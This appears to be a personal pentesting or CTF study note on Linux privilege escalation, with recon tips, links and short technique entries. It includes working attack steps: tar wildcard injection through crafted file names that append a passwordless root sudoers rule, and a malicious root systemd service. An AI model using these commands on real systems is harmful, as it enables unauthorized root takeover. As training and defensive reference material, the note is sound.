# Linux-privesc
Tags: #privesc #linux #docker #capabilities 
Related to:  [[docker]]
See also:
Previous: 

## Important Links

Title: HackTricks entry on UNIX privesc
Link: https://book.hacktricks.xyz/linux-unix/privilege-escalation
About: Huge list of techniques. Has much more than I've personally encountered (which is the content below)

## System Reconnaissance
Use LinPEAs! https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS

### Check if a tool is installed
`command -V $tool`. Note: use `-V` instead of `-v`. It provides better outpu:

```
# Example of the differences
john@box ~ % command -v docker
/usr/local/bin/docker
john@box ~ % command -V docker
docker is /usr/local/bin/docker
john@box ~ % command -v which
which
john@box ~ % command -V which
which is a shell builtin
```
### Find SUID files
```
# suid
find "$DIRECTORY" -perm /u=s,g=s
```

## Escalation techniques
### systemctl
https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49

Create a service that runs as root and does something malicious (change root password, start a rev shell, etc.)

```
/bin/systemctl enable /full/path/to/root.service
/bin/systemctl start root
```


### Tar
`--checkpoint`  flag can be used to execute a script when a wildcard is being used, e.g. `tar cf /dir *`

```
echo ‘echo “www-data ALL=(root) NOPASSWD: ALL” >> /etc/sudoers’ > sudo.sh
touch "/dir/--checkpoint-action=exec=sh sudo.sh"
touch "/dir/--checkpoint=1"
```
https://medium.com/azkrath/tryhackme-walkthrough-skynet-69399702ee5a

### Old kernels
DirtyCow 2016 exploit -- dirtycow.ninja
Many scripts, might need to compile

### Docker access
Many privesc possibilties, see [[docker]].

### Linux capabilities
- "Capabilities" == a way to relegate some things `root` can do to other processes
- `capsh --print` to show them

[Linux capabilities man page](https://linux.die.net/man/7/capabilities)

### Redhat/CentOS network-scripts
Writing/editing a file in `/etc/sysconfig/network-scripts` allows for RCE as `root`.

See: https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f

